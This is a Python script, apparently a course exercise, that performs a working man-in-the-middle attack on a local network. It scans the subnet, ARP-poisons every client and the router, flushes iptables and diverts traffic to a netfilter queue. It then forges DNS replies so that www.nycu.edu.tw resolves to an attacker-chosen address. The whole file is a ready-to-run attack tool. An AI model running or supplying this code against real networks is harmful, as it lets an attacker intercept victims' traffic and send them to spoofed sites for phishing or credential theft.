#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue # do something to packets that match filters
import scapy.all as Scapy
import netifaces
from scapy.all import ARP, Ether, srp, IP, UDP, DNSRR, DNS, DNSQR
import os

"""
send out broadcasting ARP request
to ask who has the "ip"
"""
def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return answered_list[0][1].hwsrc
    except IndexError:
        return None
"""
select target ip, 
this function will send out a fake ARP reply
implying that the source comes from "spoof_ip"
"""
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is not None:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        Scapy.send(packet, verbose=False)

"""
Use command to redirect packets to netfilterqueue
Then apply callback functions to packets:
victim send to attacker DNS request, we will send him MODIFIED DNS response
"""
def callback(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if(scapy_pkt.haslayer(DNSRR)):
        try:
            qname = scapy_pkt[DNSQR].qname
            if(b"www.nycu.edu.tw." in qname or b"nycu-nctu.cdn.hinet.net." in qname):
                #print("[INFO]: DNS spoofing www.nycu.edu.tw")
                # set attribute
                answer = DNSRR(rrname=qname, rdata="140.113.207.241")
                scapy_pkt[DNS].an = answer
                scapy_pkt[DNS].ancount = 1
                
                # remove checksum
                del scapy_pkt[IP].len
                del scapy_pkt[IP].chksum
                del scapy_pkt[UDP].len
                del scapy_pkt[UDP].chksum

                #print(scapy_pkt.show())
            
            else:
                pass
        # not UDP, this can be IPerror/ UDPerror packets
        except IndexError:
            pass
        
        pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()


if __name__ == '__main__':
    # ========== get other clients ip =========
    # find router's IP
    gateways = netifaces.gateways()
    router_ip, dev = gateways['default'][netifaces.AF_INET]

    # get ip addr: netifaces
    ip_addr = ''
    addr_dict = netifaces.ifaddresses(dev)
    ip_addr = addr_dict[netifaces.AF_INET][0]['addr']

    #print('attacker ip:', ip_addr)
    #print('router ip:', router_ip)
    target_ip = str(router_ip) + '/24'

    # list all available clients
    # arp request
    arp = ARP(pdst=target_ip)
    # ether broadcast
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack
    packet = ether/arp
    result = srp(packet, timeout=3)[0]

    # available clients
    clients = []
    print("Available devices")
    print("-----------------")
    print("IP       MAC")
    print("-----------------")

    for sent, received in result:
        # except AP
        if(received.psrc != str(router_ip)):
            clients.append(received)
            print(received.psrc, received.hwsrc)

    print("---------------")
    

    # iptables command
    os.system("sudo iptables --flush")
    os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # redirect packets
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, callback)
    # arp spoof
    for c in clients:
        # send ARP response to victim (pretend as router)
        spoof(c.psrc, router_ip)
        # send arp request to router (pretend as victim)
        spoof(router_ip, c.psrc)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("** Interrupted")
        os.system("sudo iptables --flush")

    nfqueue.unbind()